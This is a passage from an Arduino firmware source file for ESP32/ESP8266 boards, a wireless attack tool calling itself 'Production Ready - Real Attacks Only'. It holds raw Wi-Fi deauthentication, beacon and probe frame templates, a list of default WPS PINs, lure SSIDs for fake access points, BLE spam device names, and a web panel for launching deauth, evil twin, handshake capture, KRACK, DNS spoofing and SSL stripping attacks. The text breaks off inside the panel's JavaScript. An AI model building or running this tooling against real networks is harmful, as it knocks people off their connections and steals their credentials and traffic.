
/*
 * Advanced WiFi & BLE Security Testing Platform
 * Developed by 0x0806
 * ESP32/ESP8266 Compatible - Full Featured
 * Version: 4.0 - Production Ready - Real Attacks Only
 */

// Platform Detection and Includes
#ifdef ESP32
  #define PLATFORM_ESP32
  #include <WiFi.h>
  #include <WebServer.h>
  #include <DNSServer.h>
  #include <SPIFFS.h>
  #include <esp_wifi.h>
  #include <esp_wifi_types.h>
  #include <esp_bt.h>
  #include <esp_bt_main.h>
  #include <esp_gap_ble_api.h>
  #include <esp_gatts_api.h>
  #include <BLEDevice.h>
  #include <BLEServer.h>
  #include <BLEUtils.h>
  #include <BLE2902.h>
  #include <ArduinoJson.h>
  #include <nvs_flash.h>
  #include <esp_task_wdt.h>
#else
  #define PLATFORM_ESP8266
  #include <ESP8266WiFi.h>
  #include <ESP8266WebServer.h>
  #include <ESP8266mDNS.h>
  #include <DNSServer.h>
  #include <FS.h>
  #include <ArduinoJson.h>
  extern "C" {
    #include "user_interface.h"
    #include "c_types.h"
  }
  typedef ESP8266WebServer WebServer;
#endif

// Configuration Constants
const char* AP_SSID = "SecurityTester_0x0806";
const char* AP_PASS = "pwned123456";
const uint8_t AP_CHANNEL = 6;
const IPAddress AP_IP(192, 168, 4, 1);
const IPAddress SUBNET(255, 255, 255, 0);
const IPAddress GATEWAY(192, 168, 4, 1);

// Core Objects
WebServer server(80);
DNSServer dnsServer;

// Attack Statistics Structure
struct AttackStats {
  uint32_t deauth_sent = 0;
  uint32_t beacon_sent = 0;
  uint32_t probe_sent = 0;
  uint32_t handshakes_captured = 0;
  uint32_t pmkid_captured = 0;
  uint32_t ble_spam_sent = 0;
  uint32_t evil_twin_connections = 0;
  uint32_t karma_probes = 0;
  uint32_t packets_monitored = 0;
  uint32_t clients_connected = 0;
  uint32_t wps_attacks = 0;
  uint32_t krack_attempts = 0;
  uint32_t pixie_dust_attacks = 0;
  uint32_t rogue_ap_created = 0;
  uint32_t dns_spoofing = 0;
  uint32_t ssl_strip = 0;
  unsigned long uptime = 0;
  float memory_usage = 0;
  float cpu_usage = 0;
};

// Global State Variables
AttackStats stats;
volatile bool attack_running = false;
volatile bool ap_running = false;
volatile bool ble_running = false;
volatile bool monitoring_active = false;
volatile bool dns_spoofing_active = false;
volatile bool ssl_stripping_active = false;
String selected_network = "";
String selected_bssid = "";
uint8_t selected_channel = 1;
String attack_type = "none";
unsigned long last_attack_time = 0;
unsigned long attack_interval = 100;

// Network Information Structure
struct NetworkInfo {
  String ssid;
  String bssid;
  int32_t rssi;
  uint32_t channel;
  uint8_t encryption;
  bool hidden;
  uint32_t last_seen;
  bool wps_enabled;
  bool vulnerable;
};

// Data Storage
std::vector<NetworkInfo> scanned_networks;
std::vector<String> target_networks;
std::vector<String> ble_devices;
std::vector<String> connected_clients;
std::vector<String> captured_handshakes;
std::vector<String> vulnerable_networks;

// BLE Configuration
#ifdef PLATFORM_ESP32
BLEServer* pServer = nullptr;
BLECharacteristic* pCharacteristic = nullptr;
bool ble_device_connected = false;
uint32_t ble_spam_counter = 0;

// Enhanced BLE Device Names for Spam
const char* ble_spam_names[] = {
  "AirPods Pro Max", "Galaxy Buds Pro", "Sony WH-1000XM5", "Beats Studio3",
  "iPhone 14 Pro", "Samsung S23 Ultra", "MacBook Pro M2", "iPad Pro 12.9",
  "Apple Watch S8", "Tesla Model S", "Smart TV Samsung", "Gaming Headset",
  "Wireless Mouse", "Magic Keyboard", "Surface Pro 9", "Dell XPS 13",
  "HP Spectre x360", "Lenovo ThinkPad", "Google Pixel 7", "OnePlus 11",
  "Xiaomi Mi 13", "Huawei P60", "Nothing Phone", "Steam Deck",
  "Nintendo Switch", "PS5 Controller", "Xbox Series X", "VR Headset",
  "Smart Watch", "Fitness Tracker", "Bluetooth Speaker", "Car Audio",
  "Ring Doorbell", "Nest Thermostat", "Echo Dot", "Google Home",
  "Apple TV", "Roku Ultra", "Fire TV Stick", "Chromecast"
};
const int ble_spam_count = sizeof(ble_spam_names) / sizeof(ble_spam_names[0]);
#endif

// WiFi Packet Templates for Real Attacks
uint8_t deauth_packet_template[26] = {
  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x70, 0x6a, 0x01, 0x00
};

uint8_t beacon_packet_template[128] = {
  0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04,
  0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x64, 0x00, 0x01, 0x04
};

uint8_t probe_packet_template[64] = {
  0x40, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0xff, 0xff, 0xff, 0xff,
  0xff, 0xff, 0x00, 0x00
};

// WPS Pin Templates for Pixie Dust Attack
const char* common_wps_pins[] = {
  "12345670", "01234567", "11111111", "00000000", "12341234",
  "11223344", "88888888", "77777777", "55555555", "33333333"
};

// Evil Twin SSIDs
const char* evil_twin_ssids[] = {
  "Free WiFi", "Guest Network", "Public WiFi", "Hotel WiFi",
  "Airport WiFi", "Starbucks WiFi", "McDonald WiFi", "Mall WiFi",
  "Conference WiFi", "Update Required", "Router Update", "Security Alert"
};

// HTML Content with Fixed JavaScript Strings and Enhanced Mobile UI
const char captive_portal_html[] PROGMEM = R"rawliteral(<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=0.5, maximum-scale=3.0">
    <title>SecurityTester 0x0806 - Advanced Platform</title>
    <style>
        :root {
            --primary-color: #e94560;
            --secondary-color: #00d4aa;
            --accent-color: #ff6b35;
            --dark-bg: #0a0a0a;
            --dark-card: #1a1a2e;
            --darker-card: #16213e;
            --text-primary: #ffffff;
            --text-secondary: #b8b8b8;
            --border-color: #333;
            --success-color: #00ff88;
            --warning-color: #ffaa00;
            --error-color: #ff3366;
            --gradient-primary: linear-gradient(135deg, #e94560 0%, #0f3460 100%);
            --gradient-secondary: linear-gradient(135deg, #00d4aa 0%, #007b5e 100%);
            --gradient-accent: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%);
            --box-shadow: 0 8px 32px rgba(233, 69, 96, 0.3);
            --border-radius: 16px;
            --animation-speed: 0.3s;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: var(--dark-bg);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            line-height: 1.6;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.03;
        }

        .header {
            background: rgba(10, 10, 10, 0.98);
            backdrop-filter: blur(20px);
            border-bottom: 2px solid var(--primary-color);
            padding: 1rem 1.5rem;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: var(--box-shadow);
        }

        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }

        .logo {
            font-size: clamp(1.5rem, 4vw, 2.2rem);
            font-weight: 700;
            background: var(--gradient-secondary);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: 0 0 30px var(--secondary-color);
            animation: logoGlow 3s ease-in-out infinite alternate;
        }

        @keyframes logoGlow {
            from { filter: drop-shadow(0 0 10px var(--secondary-color)); }
            to { filter: drop-shadow(0 0 20px var(--secondary-color)); }
        }

        .header-stats {
            display: flex;
            gap: 1rem;
            align-items: center;
            flex-wrap: wrap;
        }

        .stat-chip {
            background: rgba(233, 69, 96, 0.2);
            border: 1px solid var(--primary-color);
            border-radius: 20px;
            padding: 0.4rem 0.8rem;
            font-size: clamp(0.7rem, 2vw, 0.85rem);
            font-weight: 600;
            white-space: nowrap;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 1rem;
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        .card {
            background: rgba(26, 26, 46, 0.95);
            border: 1px solid var(--border-color);
            border-radius: var(--border-radius);
            padding: 1.5rem;
            backdrop-filter: blur(10px);
            transition: all var(--animation-speed) cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: var(--gradient-primary);
            transform: scaleX(0);
            transition: transform var(--animation-speed) ease;
        }

        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(233, 69, 96, 0.4);
            border-color: var(--secondary-color);
        }

        .card:hover::before {
            transform: scaleX(1);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .card-title {
            font-size: clamp(1.1rem, 3vw, 1.4rem);
            font-weight: 600;
            color: var(--secondary-color);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .card-badge {
            background: var(--gradient-primary);
            color: white;
            padding: 0.3rem 0.8rem;
            border-radius: 15px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .btn {
            background: var(--gradient-primary);
            border: none;
            color: white;
            padding: 12px 20px;
            border-radius: 12px;
            cursor: pointer;
            font-size: clamp(0.8rem, 2.5vw, 1rem);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            transition: all var(--animation-speed) ease;
            width: 100%;
            margin: 0.4rem 0;
            position: relative;
            overflow: hidden;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            touch-action: manipulation;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover, .btn:focus {
            transform: scale(1.02);
            box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
            outline: none;
        }

        .btn:hover::before {
            left: 100%;
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn.success {
            background: var(--gradient-secondary);
        }

        .btn.danger {
            background: linear-gradient(135deg, var(--error-color) 0%, #8b0000 100%);
        }

        .btn.warning {
            background: var(--gradient-accent);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn.disabled {
            opacity: 0.3;
            cursor: not-allowed;
            background: #666;
        }

        .input-group {
            margin: 1rem 0;
        }

        .input-group label {
            display: block;
            color: var(--secondary-color);
            margin-bottom: 0.5rem;
            font-weight: 600;
            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
        }

        .input-group input,
        .input-group select {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid var(--border-color);
            border-radius: 12px;
            background: rgba(10, 10, 10, 0.8);
            color: var(--text-primary);
            font-size: clamp(0.9rem, 2.5vw, 1rem);
            transition: all var(--animation-speed) ease;
        }

        .input-group input:focus,
        .input-group select:focus {
            outline: none;
            border-color: var(--secondary-color);
            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
        }

        .attack-controls {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 0.8rem;
            margin: 1rem 0;
        }

        .network-list {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 1rem;
            scrollbar-width: thin;
            scrollbar-color: var(--primary-color) transparent;
        }

        .network-list::-webkit-scrollbar {
            width: 6px;
        }

        .network-list::-webkit-scrollbar-track {
            background: transparent;
        }

        .network-list::-webkit-scrollbar-thumb {
            background: var(--primary-color);
            border-radius: 3px;
        }

        .network-item {
            padding: 1rem;
            margin: 0.5rem 0;
            background: rgba(10, 10, 10, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            cursor: pointer;
            transition: all var(--animation-speed) ease;
            position: relative;
        }

        .network-item:hover {
            background: rgba(233, 69, 96, 0.2);
            border-color: var(--primary-color);
            transform: translateX(5px);
        }

        .network-item.selected {
            background: rgba(0, 212, 170, 0.2);
            border-color: var(--secondary-color);
            box-shadow: 0 0 15px rgba(0, 212, 170, 0.3);
        }

        .network-ssid {
            font-weight: 600;
            font-size: clamp(1rem, 3vw, 1.1rem);
            margin-bottom: 0.3rem;
        }

        .network-details {
            font-size: clamp(0.75rem, 2vw, 0.85rem);
            color: var(--text-secondary);
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .signal-strength {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }

        .signal-bars {
            display: flex;
            gap: 1px;
            align-items: end;
        }

        .signal-bar {
            width: 3px;
            background: var(--text-secondary);
            border-radius: 1px;
        }

        .signal-bar.active {
            background: var(--success-color);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 1rem;
            margin-top: 1rem;
        }

        .stat-item {
            text-align: center;
            padding: 1rem 0.5rem;
            background: rgba(10, 10, 10, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            transition: all var(--animation-speed) ease;
        }

        .stat-item:hover {
            background: rgba(233, 69, 96, 0.1);
            border-color: var(--primary-color);
        }

        .stat-value {
            font-size: clamp(1.5rem, 4vw, 2rem);
            font-weight: 700;
            color: var(--secondary-color);
            margin-bottom: 0.5rem;
            font-family: 'Courier New', monospace;
        }

        .stat-label {
            font-size: clamp(0.7rem, 2vw, 0.8rem);
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-indicator {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            margin: 0.5rem 0;
            background: rgba(10, 10, 10, 0.6);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--primary-color);
            border-radius: 12px;
            transition: all var(--animation-speed) ease;
        }

        .status-indicator.active {
            border-left-color: var(--success-color);
            background: rgba(0, 255, 136, 0.05);
        }

        .status-indicator.warning {
            border-left-color: var(--warning-color);
            background: rgba(255, 170, 0, 0.05);
        }

        .status-text {
            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--primary-color);
            animation: pulse 2s infinite;
        }

        .status-dot.active {
            background: var(--success-color);
        }

        .status-dot.warning {
            background: var(--warning-color);
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .log-container {
            background: rgba(10, 10, 10, 0.9);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1rem;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'SF Mono', 'Monaco', 'Inconsolata', 'Roboto Mono', monospace;
            font-size: clamp(0.75rem, 2vw, 0.85rem);
            line-height: 1.4;
            scrollbar-width: thin;
            scrollbar-color: var(--primary-color) transparent;
        }

        .log-container::-webkit-scrollbar {
            width: 6px;
        }

        .log-container::-webkit-scrollbar-track {
            background: transparent;
        }

        .log-container::-webkit-scrollbar-thumb {
            background: var(--primary-color);
            border-radius: 3px;
        }

        .log-entry {
            margin: 0.3rem 0;
            padding: 0.2rem 0;
            color: var(--secondary-color);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            word-wrap: break-word;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-entry.error {
            color: var(--error-color);
        }

        .log-entry.warning {
            color: var(--warning-color);
        }

        .log-entry.success {
            color: var(--success-color);
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--secondary-color);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin: 1rem 0;
        }

        .progress-fill {
            height: 100%;
            background: var(--gradient-primary);
            width: 0%;
            transition: width var(--animation-speed) ease;
            animation: progressGlow 2s ease-in-out infinite alternate;
        }

        @keyframes progressGlow {
            from { box-shadow: 0 0 5px var(--primary-color); }
            to { box-shadow: 0 0 15px var(--primary-color); }
        }

        .footer {
            background: rgba(10, 10, 10, 0.98);
            border-top: 1px solid var(--border-color);
            padding: 2rem 1rem;
            text-align: center;
            color: var(--text-secondary);
            margin-top: 3rem;
        }

        .footer-content {
            max-width: 1400px;
            margin: 0 auto;
        }

        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
        }

        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--dark-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1rem 1.5rem;
            color: var(--text-primary);
            z-index: 3000;
            transform: translateX(400px);
            transition: transform var(--animation-speed) ease;
            max-width: 90vw;
            word-wrap: break-word;
        }

        .toast.show {
            transform: translateX(0);
        }

        .toast.success {
            border-left: 4px solid var(--success-color);
        }

        .toast.error {
            border-left: 4px solid var(--error-color);
        }

        .toast.warning {
            border-left: 4px solid var(--warning-color);
        }

        @media (max-width: 768px) {
            .container {
                padding: 0.5rem;
            }
            
            .header {
                padding: 0.8rem 1rem;
            }
            
            .header-content {
                flex-direction: column;
                text-align: center;
                gap: 0.5rem;
            }
            
            .header-stats {
                justify-content: center;
                flex-wrap: wrap;
                gap: 0.5rem;
            }
            
            .card {
                padding: 1rem;
            }
            
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .attack-controls {
                grid-template-columns: 1fr;
            }
            
            .toast {
                top: 10px;
                right: 10px;
                left: 10px;
                max-width: none;
                transform: translateY(-100px);
            }
            
            .toast.show {
                transform: translateY(0);
            }
        }

        @media (max-width: 480px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .network-details {
                flex-direction: column;
                gap: 0.3rem;
            }
        }

        /* Enhanced animations */
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card {
            animation: fadeInUp 0.6s ease-out;
        }

        .card:nth-child(2) { animation-delay: 0.1s; }
        .card:nth-child(3) { animation-delay: 0.2s; }
        .card:nth-child(4) { animation-delay: 0.3s; }

        /* Touch improvements */
        @media (hover: none) and (pointer: coarse) {
            .btn:hover {
                transform: none;
            }
            
            .card:hover {
                transform: none;
            }
            
            .network-item:hover {
                transform: none;
            }
        }
    </style>
</head>
<body>
    <div class="matrix-bg" id="matrix-canvas"></div>
    
    <div class="header">
        <div class="header-content">
            <div>
                <div class="logo">SecurityTester 0x0806</div>
                <div style="font-size: clamp(0.7rem, 2vw, 0.9rem); opacity: 0.8; margin-top: 0.3rem;">
                    Advanced WiFi & BLE Security Platform v4.0
                </div>
            </div>
            <div class="header-stats">
                <div class="stat-chip">
                    <span id="platform-info">Platform: Loading...</span>
                </div>
                <div class="stat-chip">
                    <span id="uptime-display">Uptime: 00:00:00</span>
                </div>
                <div class="stat-chip">
                    <span id="memory-usage">RAM: 0%</span>
                </div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="dashboard-grid">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Network Scanner</h3>
                    <span class="card-badge" id="scan-badge">Ready</span>
                </div>
                <div class="attack-controls">
                    <button class="btn success" onclick="scanNetworks()" id="scan-btn">
                        <span id="scan-text">Scan Networks</span>
                        <div id="scan-loading" class="loading-spinner" style="display: none;"></div>
                    </button>
                    <button class="btn" onclick="scanBLE()" id="ble-scan-btn">
                        <span>Scan BLE</span>
                    </button>
                    <button class="btn warning" onclick="scanVulnerabilities()">
                        <span>Scan Vulns</span>
                    </button>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="scan-progress"></div>
                </div>
                <div class="network-list" id="network-list">
                    <div style="text-align: center; padding: 2rem; color: var(--text-secondary);">
                        Click "Scan Networks" to discover targets
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Attack Vectors</h3>
                    <span class="card-badge" id="attack-badge">Standby</span>
                </div>
                <div class="input-group">
                    <label for="attack-type">Attack Vector</label>
                    <select id="attack-type">
                        <option value="deauth">Deauthentication Attack</option>
                        <option value="beacon">Beacon Flood</option>
                        <option value="probe">Probe Request Spam</option>
                        <option value="evil_twin">Evil Twin AP</option>
                        <option value="karma">Karma Attack</option>
                        <option value="handshake">Handshake Capture</option>
                        <option value="pmkid">PMKID Capture</option>
                        <option value="monitor">Packet Monitor</option>
                        <option value="wps_attack">WPS Attack</option>
                        <option value="pixie_dust">Pixie Dust Attack</option>
                        <option value="krack">KRACK Attack</option>
                        <option value="rogue_ap">Rogue Access Point</option>
                        <option value="dns_spoof">DNS Spoofing</option>
                        <option value="ssl_strip">SSL Stripping</option>
                        <option value="ble_spam" id="ble_spam_option">BLE Device Spam</option>
                        <option value="ble_flood" id="ble_flood_option">BLE Beacon Flood</option>
                        <option value="ble_hijack" id="ble_hijack_option">BLE Hijacking</option>
                    </select>
                </div>
                <div class="input-group">
                    <label for="attack-intensity">Attack Intensity</label>
                    <select id="attack-intensity">
                        <option value="low">Low (100ms interval)</option>
                        <option value="medium" selected>Medium (50ms interval)</option>
                        <option value="high">High (10ms interval)</option>
                        <option value="extreme">Extreme (1ms interval)</option>
                        <option value="nuclear">Nuclear (Continuous)</option>
                    </select>
                </div>
                <div class="attack-controls">
                    <button class="btn danger" onclick="startAttack()" id="attack-start-btn">
                        Launch Attack
                    </button>
                    <button class="btn" onclick="stopAttack()" id="attack-stop-btn">
                        Stop Attack
                    </button>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="attack-progress"></div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">System Status</h3>
                    <span class="card-badge">Live</span>
                </div>
                <div class="status-indicator active" id="ap-status">
                    <span class="status-text">Access Point: Active</span>
                    <div class="status-dot active"></div>
                </div>
                <div class="status-indicator" id="wifi-status">
                    <span class="status-text">WiFi Attack: Standby</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator" id="ble-status">
                    <span class="status-text">BLE Attack: Standby</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator" id="monitor-status">
                    <span class="status-text">Packet Monitor: Inactive</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator" id="dns-status">
                    <span class="status-text">DNS Spoofing: Inactive</span>
                    <div class="status-dot"></div>
                </div>
                <div class="status-indicator active" id="web-status">
                    <span class="status-text">Web Interface: Online</span>
                    <div class="status-dot active"></div>
                </div>
            </div>
        </div>

        <div class="grid-2">
            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Attack Statistics</h3>
                    <button class="btn" onclick="resetStats()">Reset</button>
                </div>
                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-value" id="deauth-count">0</div>
                        <div class="stat-label">Deauth Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="beacon-count">0</div>
                        <div class="stat-label">Beacons Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="probe-count">0</div>
                        <div class="stat-label">Probes Sent</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="handshake-count">0</div>
                        <div class="stat-label">Handshakes</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="ble-count">0</div>
                        <div class="stat-label">BLE Spam</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="clients-count">0</div>
                        <div class="stat-label">Connected</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="wps-count">0</div>
                        <div class="stat-label">WPS Attacks</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="krack-count">0</div>
                        <div class="stat-label">KRACK Attempts</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value" id="dns-count">0</div>
                        <div class="stat-label">DNS Spoofs</div>
                    </div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h3 class="card-title">Activity Monitor</h3>
                    <button class="btn" onclick="clearLogs()">Clear</button>
                </div>
                <div class="log-container" id="log-container">
                    <div class="log-entry success">System initialized - SecurityTester 0x0806 v4.0</div>
                    <div class="log-entry">Access Point started successfully</div>
                    <div class="log-entry">Web interface ready on port 80</div>
                    <div class="log-entry">Platform detection completed</div>
                    <div class="log-entry">Enhanced attack vectors loaded</div>
                    <div class="log-entry">All systems operational</div>
                </div>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <p style="font-size: clamp(1rem, 3vw, 1.1rem); margin-bottom: 0.5rem;">
                <strong>SecurityTester 0x0806 v4.0</strong> - Advanced Security Testing Platform
            </p>
            <p style="opacity: 0.7;">
                Developed by 0x0806 | Enhanced Attack Vectors | Mobile Optimized
            </p>
            <p style="font-size: clamp(0.7rem, 2vw, 0.8rem); margin-top: 1rem; opacity: 0.5;">
                For Educational and Authorized Testing Only - Use Responsibly
            </p>
        </div>
    </div>

    <div id="toast" class="toast">
        <div id="toast-message"></div>
    </div>

    <script>
        var scanInterval, statsInterval, uptimeInterval;
        var isScanning = false;
        var isAttacking = false;
        var selectedNetwork = null;
        var systemUptime = 0;
        var bleSupported = false;

        function initMatrix() {
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            document.getElementById("matrix-canvas").appendChild(canvas);

            var chars = "0x0806ABCDEFabcdef0123456789";
            var fontSize = 14;
            var columns = canvas.width / fontSize;
            var drops = [];

            for (var x = 0; x < columns; x++) {
                drops[x] = 1;
            }

            function draw() {
                ctx.fillStyle = "rgba(15, 15, 35, 0.08)";
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                ctx.fillStyle = "#e94560";
                ctx.font = fontSize + "px monospace";

                for (var i = 0; i < drops.length; i++) {
                    var text = chars[Math.floor(Math.random() * chars.length)];
                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);

                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                        drops[i] = 0;
                    }
                    drops[i]++;
                }
            }

            setInterval(draw, 50);

            window.addEventListener("resize", function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            });
        }

        function showToast(message, type) {
            type = type || "info";
            var toast = document.getElementById("toast");
            var toastMessage = document.getElementById("toast-message");
            
            toastMessage.textContent = message;
            toast.className = "toast " + type + " show";
            
            setTimeout(function() {
                toast.classList.remove("show");
            }, 3000);
        }

        function addLog(message, type) {
            type = type || "info";
            var logContainer = document.getElementById("log-container");
            var logEntry = document.createElement("div");
            logEntry.className = "log-entry " + type;
            logEntry.innerHTML = "<span style=\"opacity: 0.6;\">[" + new Date().toLocaleTimeString() + "]</span> " + message;
            
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;

            while (logContainer.children.length > 50) {
                logContainer.removeChild(logContainer.firstChild);
            }
        }

        function updateProgress(elementId, percentage) {
            var progressBar = document.getElementById(elementId);
            if (progressBar) {
                progressBar.style.width = percentage + "%";
            }
        }

        function disableBLEFeatures() {
            var bleSpamOption = document.getElementById("ble_spam_option");
            var bleFloodOption = document.getElementById("ble_flood_option");
            var bleHijackOption = document.getElementById("ble_hijack_option");
            var bleScanBtn = document.getElementById("ble-scan-btn");
            
            if (bleSpamOption) bleSpamOption.disabled = true;
            if (bleFloodOption) bleFloodOption.disabled = true;
            if (bleHijackOption) bleHijackOption.disabled = true;
            if (bleScanBtn) {
                bleScanBtn.classList.add("disabled");
                bleScanBtn.disabled = true;
            }
            
            addLog("BLE features disabled - not supported on this platform", "warning");
        }

        function scanNetworks() {
            if (isScanning) return;
            
            isScanning = true;
            var scanBtn = document.getElementById("scan-btn");
            var scanText = document.getElementById("scan-text");
            var scanLoading = document.getElementById("scan-loading");
            var scanBadge = document.getElementById("scan-badge");
            
            scanText.style.display = "none";
            scanLoading.style.display = "inline-block";
            scanBtn.disabled = true;
            scanBadge.textContent = "Scanning";
            
            addLog("Starting comprehensive network scan...", "info");
            
            var progressCounter = 0;
            var progressInterval = setInterval(function() {
                if (progressCounter <= 100) {
                    updateProgress("scan-progress", progressCounter);
                    progressCounter += 5;
                } else {
                    clearInterval(progressInterval);
                }
            }, 100);

            fetch("/scan")
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    updateNetworkList(data.networks || []);
                    addLog("Network scan completed - Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
                    showToast("Found " + (data.networks ? data.networks.length : 0) + " networks", "success");
                })
                .catch(function(error) {
                    addLog("Network scan failed: " + error.message, "error");
                    showToast("Scan failed: " + error.message, "error");
                })
                .finally(function() {
                    scanText.style.display = "inline-block";
                    scanLoading.style.display = "none";
                    scanBtn.disabled = false;
                    scanBadge.textContent = "Ready";
                    updateProgress("scan-progress", 0);
                    isScanning = false;
                });
        }

        function scanVulnerabilities() {
            addLog("Starting vulnerability assessment...", "warning");
            showToast("Vulnerability scan started", "warning");
            
            fetch("/scan/vulnerabilities")
                .then(function(response) { return response.json(); })
                .then(function(data) {
